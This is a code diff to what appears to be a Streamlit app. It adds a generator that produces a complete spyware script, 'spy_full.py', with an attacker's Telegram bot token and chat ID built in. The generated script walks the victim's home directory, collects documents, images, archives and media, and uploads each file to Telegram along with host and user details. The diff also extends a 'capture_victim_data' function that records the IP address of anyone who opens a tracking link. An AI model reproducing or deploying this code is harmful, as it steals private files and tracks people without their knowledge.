@@ -90,6 +90,127 @@ def handle_file_upload(uploaded_file):
         return False, str(e)
 
 
+
+
+# ============= دالة توليد spy_full.py بشكل آلي =============
+def generate_spy_full_with_credentials(bot_token, chat_id):
+    """توليد ملف spy_full.py ببيانات تلجرام المستخدم"""
+    spy_code = f"""#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import requests
+import sys
+from pathlib import Path
+import platform
+import socket
+
+# ============= إعدادات تلجرام (مضبوطة تلقائياً) =============
+TELEGRAM_BOT_TOKEN = "{bot_token}"
+TELEGRAM_CHAT_ID = "{chat_id}"
+
+# ============= إعدادات المسح =============
+root_path = os.path.expanduser("~")
+extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z', '.gif', '.bmp', '.wav', '.mp3')
+
+# ============= معلومات الجهاز =============
+def get_device_info():
+    try:
+        device_name = socket.gethostname()
+        system = platform.system()
+        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
+        return f"{{system}} | {{device_name}} | User: {{user}}"
+    except:
+        return "Unknown Device"
+
+# ============= دالة إرسال الملفات عبر تلجرام =============
+def send_file_to_telegram(file_path, original_path):
+    try:
+        if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "":
+            return False, "❌ توكين البوت غير مضبوط"
+        
+        file_size = os.path.getsize(file_path)
+        
+        if file_size > 50 * 1024 * 1024:
+            return False, f"⏭️  الملف كبير جداً"
+        
+        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"
+        
+        with open(file_path, 'rb') as f:
+            files = {{'document': f}}
+            caption = f"""
+📁 **ملف مسحوب جديد**
+
+📄 **الملف:** {{os.path.basename(file_path)}}
+📍 **المسار الأصلي:** {{original_path}}
+💾 **الحجم:** {{file_size / 1024:.2f}} KB
+🖥️ **الجهاز:** {{get_device_info()}}
+⏰ **الوقت:** {{__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
+"""
+            data = {{
+                'chat_id': TELEGRAM_CHAT_ID,
+                'caption': caption,
+                'parse_mode': 'Markdown'
+            }}
+            
+            response = requests.post(url, files=files, data=data, timeout=60)
+            return response.status_code == 200, "✅ تم الإرسال" if response.status_code == 200 else "❌ فشل"
+    except:
+        return False, "❌ خطأ"
+
+# ============= دالة إرسال رسالة نصية =============
+def send_message_to_telegram(message):
+    try:
+        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendMessage"
+        data = {{'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}}
+        response = requests.post(url, data=data, timeout=30)
+        return response.status_code == 200
+    except:
+        return False
+
+# ============= البرنامج الرئيسي =============
+print("⚡ RASHD_AI: FILE EXFILTRATION STARTED ⚡")
+
+startup_msg = f"🚀 نظام سحب الملفات قد بدأ العمل\n🖥️ الجهاز: {{get_device_info()}}"
+send_message_to_telegram(startup_msg)
+
+count = 0
+failed = 0
+total_size = 0
+
+try:
+    for root, dirs, files in os.walk(root_path):
+        skip_dirs = ['.git', '.venv', '__pycache__', 'node_modules', '.cache', 'AppData', 'Library', 'System Volume Information']
+        dirs[:] = [d for d in dirs if d not in skip_dirs]
+        
+        for file in files:
+            if file.lower().endswith(extensions):
+                file_path = os.path.join(root, file)
+                
+                try:
+                    file_size = os.path.getsize(file_path)
+                    
+                    if file_size > 50 * 1024 * 1024:
+                        continue
+                    
+                    success, message = send_file_to_telegram(file_path, file_path)
+                    
+                    if success:
+                        count += 1
+                        total_size += file_size
+                except:
+                    failed += 1
+
+except KeyboardInterrupt:
+    pass
+
+summary_msg = f"✅ انتهى سحب الملفات\n✅ تم تحميل: {{count}} ملفات\n❌ فشل: {{failed}} ملفات\n💾 الحجم: {{total_size / 1024 / 1024:.2f}} MB"
+send_message_to_telegram(summary_msg)
+
+sys.exit(0)
+"""
+    return spy_code
+
 def capture_victim_data():
     """التقاط بيانات الضحية عند فتح رابط التتبع"""
     query_params = st.query_params
@@ -99,9 +220,19 @@ def capture_victim_data():
             # الحصول على عنوان IP الحقيقي للزائر
             user_ip = 'Unknown'
             try:
-                ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
-                if ip_response.status_code == 200:
-                    user_ip = ip_response.json().get('ip', 'Unknown')
+                # محاولة الحصول على IP من X-Forwarded-For (للسيرفرات خلف Proxy)
+                if 'HTTP_X_FORWARDED_FOR' in os.environ:
+                    user_ip = os.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
+                else:
+                    # محاولة استخدام ipify
+                    ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
+                    if ip_response.status_code == 200:
+                        user_ip = ip_response.json().get('ip', 'Unknown')
+                    else:
+                        # محاولة بديلة
+                        ip_response = requests.get('https://checkip.amazonaws.com', timeout=5)
+                        if ip_response.status_code == 200:
+                            user_ip = ip_response.text.strip()
             except:
                 pass
             
